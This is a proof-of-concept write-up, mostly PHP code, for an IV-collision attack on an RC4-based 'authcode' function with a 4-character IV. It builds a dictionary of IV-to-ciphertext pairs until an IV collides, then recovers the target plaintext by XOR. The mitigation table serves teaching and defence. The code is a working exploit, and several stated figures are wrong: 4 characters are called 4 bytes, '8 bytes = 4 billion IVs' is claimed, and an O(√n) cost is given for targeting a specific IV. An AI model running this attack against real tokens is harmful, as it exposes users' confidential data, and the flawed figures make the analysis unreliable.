# 48 - IV Collision Dictionary Attack PoC

## Overview

This is a practical demonstration of attacking stream cipher encryption even when an IV (Initialization Vector) is enabled. The attack exploits the small IV space (4 bytes = 65,536 possibilities) by collecting encrypted samples until finding an IV collision.

## Attack Strategy

```
1. Intercept target ciphertext (cipher2) with unknown plaintext
2. Repeatedly encrypt known plaintext (cipher1) with random IVs
3. Store each (IV → ciphertext) pair in a dictionary
4. When collected IV matches target's IV → same keystream → XOR crack works
```

## The Code

### Setup and Configuration

```php
<?php
define('UC_KEY', 'aaaaaaaaaaaaaaaaaaaaaaaaaaa');  // shared secret key

$plaintext1 = "aaaabbbbxxxx";   // known plaintext (attacker controls)
$plaintext2 = "ccccbbbbcccc";   // target plaintext (attacker wants to recover)

$guess_result = "";
$time_start = time();

$dict = array();         // dictionary: IV → ciphertext
global $ckey_length;
$ckey_length = 4;        // 4-byte IV = 65,536 possible values

echo "Collecting Dictionary(XOR Keys).\n";
```

### Dictionary Collection Loop

```php
// Step 1: Encrypt target plaintext once (simulates intercepted ciphertext)
$cipher2 = authcode($plaintext2, "ENCODE", UC_KEY);

// Step 2: Collect dictionary of (IV → ciphertext) pairs
$counter = 0;
for (;;) {
    $counter++;

    // Encrypt known plaintext with random IV
    $cipher1 = authcode($plaintext1, "ENCODE", UC_KEY);

    // Extract IV (first 4 chars)
    $keyc1 = substr($cipher1, 0, $ckey_length);

    // Decode ciphertext
    $cipher1 = base64_decode(substr($cipher1, $ckey_length));

    // Store in dictionary
    $dict[$keyc1] = $cipher1;

    // Check for collision every 1000 attempts
    if ($counter % 1000 == 0) {
        echo ".";
        if ($guess_result = guess($dict, $cipher2)) {
            break;  // IV collision found!
        }
    }
}

array_unique($dict);

echo "\nDictionary Collecting Finished..\n";
echo "Collected " . count($dict) . " XOR Keys\n";
```

### Collision Detection Function

```php
function guess($dict, $cipher2) {
    global $plaintext1, $ckey_length;

    // Extract target's IV
    $keyc2 = substr($cipher2, 0, $ckey_length);
    $cipher2 = base64_decode(substr($cipher2, $ckey_length));

    // Check if we have a matching IV in dictionary
    for ($i = 0; $i < count($dict); $i++) {
        if (array_key_exists($keyc2, $dict)) {
            echo "\nFound key in dictionary!\n";
            echo "keyc is: " . $keyc2 . "\n";
            // Same IV → same keystream → crack it!
            return crack($plaintext1, $dict[$keyc2], $cipher2);
            break;
        }
    }
    return False;  // no match yet
}
```

### Results Display

```php
echo "\ncounter is:" . $counter . "\n";
$time_spend = time() - $time_start;
echo "crack time is: " . $time_spend . " seconds\n";
echo "crack result is:" . $guess_result . "\n";
```

### XOR Cancellation Attack

```php
function crack($plain, $cipher_p, $cipher_t) {
    $target = '';

    // Skip 26-byte header (10 expiry + 16 hash)
    $tmp_p = substr($cipher_p, 26);  // encrypted known plaintext
    $tmp_t = substr($cipher_t, 26);  // encrypted target plaintext

    // XOR cancellation: plain XOR E(plain) XOR E(target) = target
    for ($i = 0; $i < strlen($plain); $i++) {
        $target .= chr(ord($plain[$i]) ^ ord($tmp_p[$i]) ^ ord($tmp_t[$i]));
    }
    return $target;
}
```

### Helper Function

```php
function hex($str) {
    $result = '';
    for ($i = 0; $i < strlen($str); $i++) {
        $result .= "\\x" . ord($str[$i]);
    }
    return $result;
}
```

### The authcode Function

```php
function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    global $ckey_length;

    // Key derivation
    $key = md5($key ? $key : UC_KEY);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length):
        substr(md5(microtime()), -$ckey_length)) : '';

    $cryptkey = $keya . md5($keya . $keyc);
    $key_length = strlen($cryptkey);

    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) :
        sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
    $string_length = strlen($string);

    // RC4 initialization
    $result = '';
    $box = range(0, 255);
    $rndkey = array();
    for ($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }

    for ($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    // RC4 encryption/decryption
    for ($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }

    // Decode and verify
    if ($operation == 'DECODE') {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) &&
            substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc . str_replace('=', '', base64_encode($result));
    }
}
?>
```

## How It Works

### The Math

```
Given two ciphertexts with the SAME IV (same keystream):
  E(A) = A xor Keystream
  E(B) = B xor Keystream

XOR cancellation:
  A xor E(A) xor E(B) = A xor (A xor K) xor (B xor K)
                      = B
```

### Attack Timeline

```
1. Target cipher2 encrypted with IV "a3f2"
2. Collect dictionary by encrypting plaintext1 repeatedly:
   - Attempt 1: IV "7bc1" → store
   - Attempt 2: IV "f09e" → store
   - ...
   - Attempt N: IV "a3f2" → MATCH!
3. Both use same keystream → XOR crack succeeds
```

### Expected Performance

```
IV space: 4 bytes = 16^4 = 65,536 possibilities
Expected attempts: ~32,768 (50% probability)
Actual time: 2-5 seconds
```

## Key Insights

| Aspect | Detail |
|--------|--------|
| **Vulnerability** | Small IV space allows brute-force collision |
| **Attack type** | Known-plaintext + IV collision |
| **Success rate** | ~50% after 32,768 attempts |
| **Time complexity** | O(√n) where n = IV space size |
| **Mitigation** | Use 12-16 byte IV (96-128 bits) |

## Why 4-Byte IV Fails

```
4 bytes  = 65,536 IVs     → crackable in seconds
8 bytes  = 4 billion IVs  → impractical
16 bytes = 3.4×10^38 IVs  → impossible
```

The birthday paradox makes collision likely after √65,536 ≈ 256 samples when looking for any collision, or ~32,768 attempts when targeting a specific IV.
